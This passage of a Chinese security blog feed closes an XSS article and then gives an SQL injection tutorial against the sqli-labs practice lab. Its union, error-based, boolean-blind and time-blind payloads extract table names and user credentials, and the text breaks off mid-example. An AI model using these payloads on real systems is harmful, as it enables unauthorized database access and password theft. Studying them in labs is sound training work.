编码或HTML编码来包装数据，并将其作为文本而不是可执行脚本来处理</strong>。</p></li><li><p><strong>输出编码</strong>：当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS，特殊字符(如&lt;&gt;&amp;'“等），为了确保输出内容的完整性和正确性，可以使用编码<code>HTMLEncode</code>进行处理。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731106.png"alt="image-20231109154200235" /><figcaption aria-hidden="true">image-20231109154200235</figcaption></figure></li></ul><h2 id="web安全编码规范">8.3 Web安全编码规范</h2><p>核心思想：将未信任数据嵌入到任何输出之前都应按照上下文的转义规则对其进行编码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731107.png"alt="image-20231109155204593" /><figcaption aria-hidden="true">image-20231109155204593</figcaption></figure><h1 id="xss相关工具及使用">9. XSS相关工具及使用</h1><ul><li>Burp：抓包，然后右键选择<code>Do an active scan</code></li><li>XSS测试平台：是测试XSS漏洞获取Cookie并接受Web页面的平台，可以窃取Cookie、后台增删改文章、钓鱼、修改网页代码等，源码基于xsser.me。</li><li>BruteXSS是跨站点脚本暴力注入的工具，误报量低。</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入漏洞">0. SQL注入漏洞</h1><h2 id="漏洞原理">0.1 漏洞原理</h2><p>未经充分验证和过滤的用户输入数据被直接拼接到SQL查询中，导致攻击者能够插入恶意SQL代码执行未经授权的数据库操作。</p><h2 id="分类">0.2 分类</h2><h3 id="按注入点类型分类">0.2.1 按注入点类型分类</h3><h4 id="数字型注入">0.2.1.1 数字型注入</h4><p><strong>原理：</strong></p><p>输入的参数为整数，如ID、年龄、页码等，如果存在注入型漏洞，则为数字型 (整型）注入。</p><p>例：<code>http:/www.testweb.com/user.php?id=8</code>，实际查询代码原型诸如:<code>select…from…where id=$id…</code></p><p><strong>测试方法：</strong></p><table><thead><tr class="header"><th>payload</th><th>返回结果</th></tr></thead><tbody><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1'</td><td>返回错误</td></tr><tr class="even"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1</td><td>运行正常</td></tr><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2</td><td>运行异常</td></tr></tbody></table><h4 id="字符型注入">0.2.1.2 字符型注入</h4><p><strong>原理：</strong></p><p>输入的参数为字符串，与数字型注入的区别在于:字符型注入一般要使用单引号来闭合。</p><p>例：<code>htp://www.testweb.com/test.php?user=admin</code>，实际查询代码原型诸如:<code>Select…from…Where id='$id'….</code></p><p><strong>测试方法：</strong></p><table><thead><tr class="header"><th>payload</th><th>返回结果</th></tr></thead><tbody><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1'</td><td>返回错误</td></tr><tr class="even"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1' and '1'='1</td><td>运行正常</td></tr><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1' and '1'='2</td><td>运行异常</td></tr></tbody></table><h4 id="搜索型注入">0.2.1.3 搜索型注入</h4><ul><li>这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“Keyword=关键字”，有的不显示链接地址，而是直接通过搜索框表单提交。</li><li>此类注入点提交的 SQL 语句，其原型大致为:<code>select * from 表名 where 字段 like ‘%关键字%'</code></li><li>当我们提交注入参数为<code>keyword='and[查询条件] and %'='</code>，则向数据库提交的SQL语句为:<code>select * from 表名 where 字段 like '%' and[查询条件] and '%'='%'</code></li></ul><h3 id="按注入技术分类">0.2.2 按注入技术分类</h3><ul><li>基于布尔的盲注：可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</li><li>基于报错的注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>联合查询注入：可以使用union的情况下的注入</li><li>堆查询注入：同时执行多条语句的注入</li></ul><h2 id="sql基础">0.3 SQL基础</h2><p>常用注释符：</p><ul><li><p><code>#</code></p></li><li><p><code>--</code></p></li></ul><h2 id="基本注入流程">0.4 基本注入流程</h2><ol type="1"><li>判断是否存在注入点;</li><li>判断字段长度(字段数）;</li><li>判断字段回显位置;</li><li>判断数据库信息;</li><li>查找数据库名;</li><li>查找数据库表;</li><li>查找数据库表中所有字段以及字段值;</li><li>猜解账号密码;</li><li>登录管理员后台。</li></ol><h1 id="基于联合查询的数字型get注入">1. 基于联合查询的数字型GET注入</h1><h2 id="原理">1.1 原理</h2><p>数字型GET注入，其注入点存在于URL中的GET参数处，如<code>http://www.testweb.com/user.php?id=8</code>，而服务器后端实际查询代码原型诸如：<code>select … from … where id=$id…</code>。攻击者可以通过构造恶意的GET输入参数，利用unionselect命令进行注入，暴露数据库中存储的信息。</p><p><strong>information_schema数据库:</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311011911741.png"alt="image-20231101161612604" /><figcaption aria-hidden="true">image-20231101161612604</figcaption></figure><h2 id="注入过程">1.2 注入过程</h2><ol type="1"><li><p>寻找注入点，判断注入类型</p></li><li><p>获取网站查询的字段数（关键字order by）</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;//--+作用：注释掉后面语句（也可用编码后的#，为%23）<br>&gt;<span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 order by 3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>判断网站的回显位置</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,database()--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h1 id="基于联合查询的字符型get注入">2. 基于联合查询的字符型GET注入</h1><h2 id="原理-1">2.1 原理</h2><p>字符型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：<code>select … from … where id=’$id’…</code>。攻击者可以通过构造恶意的GET输入参数，利用unionselect命令进行注入，暴露数据库中存储的信息。<strong>与数字型注入的区别在于:字符型注入一般需要单引号来闭合.</strong></p><h2 id="注入过程-1">2.2 注入过程</h2><ol type="1"><li><p>寻找注入点，判断注入类型</p></li><li><p>获取网站查询的字段数（关键字order by）</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;<span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; order by 3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>判断网站的回显位置</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,database()--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h1 id="基于联合查询的post注入">3. 基于联合查询的POST注入</h1><h2 id="post注入原理">3.1 POST注入原理</h2><p>POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用unionselect命令进行注入，暴露数据库中存储的信息。</p><h2 id="注入流程">3.2 注入流程</h2><p>实例:sqli-labs/Less-11(同GET型)</p><h1 id="基于报错的注入">4. 基于报错的注入</h1><h2 id="概述">4.1 概述</h2><ul><li><p>基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。</p></li><li><p>报错注入一般需要具备两个前提条件：</p><ul><li><p>Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；</p></li><li><p>后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。</p></li></ul></li></ul><h2 id="extractvalue函数">4.2 extractvalue()函数</h2><h3 id="原理-2">4.2.1 原理</h3><ul><li>作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。</li><li>语法：<code>extractvalue(XML_document, XPath_string)</code><ul><li>参数1：<code>XML_document</code>是String格式，为XML文档对象的名称；</li><li>参数2：<code>XPath_string</code>(Xpath格式的字符串)，注入时可操作的地方。</li></ul></li><li>报错原理：xml文档中查找字符位置是用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：<code>XPATH syntax error:'xxxxxxxx’</code>。</li><li>注意：extractvalue()函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示。</li><li>实例:<code>select extractvalue(1,concat('~',user()))</code>——主要是构造concat</li></ul><h3 id="注入流程-1">4.2.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型(本例为字符型注入)</p></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,database())<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//limit 0,1:显示security库中的第1张表的名字;select语句需要括号包裹</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select table_name from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> limit 0,1))<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//显示users表中的第1个字段的名字</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select column_name from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span> limit 0,1))<br>)--+<br><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//显示第1组数据</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1))<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="floor函数">4.3 floor()函数</h2><h3 id="原理-3">4.3.1 原理</h3><ul><li>在进行报错注入时，floor()函数一般需要与rand()、count()、groupby联用。</li><li>作用：<ul><li>floor(x)：对参数x向下取整；</li><li>rand()：生成一个0~1之间的随机浮点数；</li><li>count(*)：统计某个表下总共有多少条记录；</li><li>group by x：按照（by）一定的规则（x）进行分组；</li></ul></li><li>报错原理：floor()函数与groupby、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由groupby将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicateentry ‘…’ for key 'group_key’。</li><li>实例:<code>select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a</code>——主要是构造concat</li></ul><h3 id="注入流程-2">4.3.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型（本例为字符型注入）</p></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(<span class="hljs-strong">*),</span><br><span class="hljs-strong">concat(database(),floor(rand(0)*</span>2))x <br>from information_schema.tables group by x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//limit 0,1:显示security库中的第1张表的名字<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//显示users表中的第1个字段的名字<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//显示第1组数据<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="其他函数">4.4 其他函数</h2><h3 id="updatexml">4.4.1 updatexml()</h3><p>实例:<code>select updatexml(1,concat('~',user()),1)</code></p><h3 id="exp">4.4.2 exp()</h3><p>实例:<code>select exp(~(select * from (select user()) as x))</code></p><h1 id="sql盲注">5. SQL盲注</h1><h2 id="基于布尔的盲注">5.1 基于布尔的盲注</h2><h3 id="原理-4">5.1.1 原理</h3><p>某些场合下，页面返回的结果只有<strong>两种（正常或错误）</strong>。通过构造SQL判断语句，查看页面的返回结果（Trueor False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。</p><h3 id="注入流程-3">5.1.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型</p></li><li><p>盲猜网站当前所在数据库的库名长度</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句length(database())=M，不断变化M的值去猜测，如果M不等于N，页面应该</span><br><span class="hljs-comment">//显示为False；如果M等于N，页面应该显示为True。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜网站当前所在数据库的库名字符串</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//本步骤通过逐个字母盲猜的方式进行。</span><br><span class="hljs-comment">//假设库名字符串的第1个字母为a，那么条件判断语句 substr(库名字符串,1,1)=‘a’ 以及 ascii(substr(库名字串,1,1))=97 //返回的结果均应为True（小写字母a的ASCII码为97）；</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),1,1)=<span class="hljs-emphasis">&#x27;s&#x27;</span>--+<br>或<br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜数据库security的全部表名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>张表的表名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span><span class="hljs-string">e&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表的全部字段名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>个字段名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表username和password字段的全部值</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="基于时间的盲注">5.2 基于时间的盲注</h2><h3 id="原理-5">5.2.1 原理</h3><p>某些场合下，页面只有<strong>一种</strong>返回结果，使用具有延时功能的函数sleep()、benchmark()等，通过判断这些函数是否正常执行来获取数据库中的数据。</p><h3 id="注入流程-4">5.2.3 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型</p></li><li><p>盲猜网站当前所在数据库的库名长度</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())=M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜网站当前所在数据库的库名字符串</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//本步骤通过逐个字母盲猜的方式进行。</span><br><span class="hljs-comment">//假设库名字符串的第1个字母为a，那么条件判断语句 if(substr(库名字符串,1,1)=‘a’,sleep(5),1) 以及 //if(ascii(substr(库名字符串,1,1))=97,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟；</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),1,1)=<span class="hljs-emphasis">&#x27;s&#x27;</span>,sleep(5),1)--+<br>或<br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜数据库security的全部表名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span 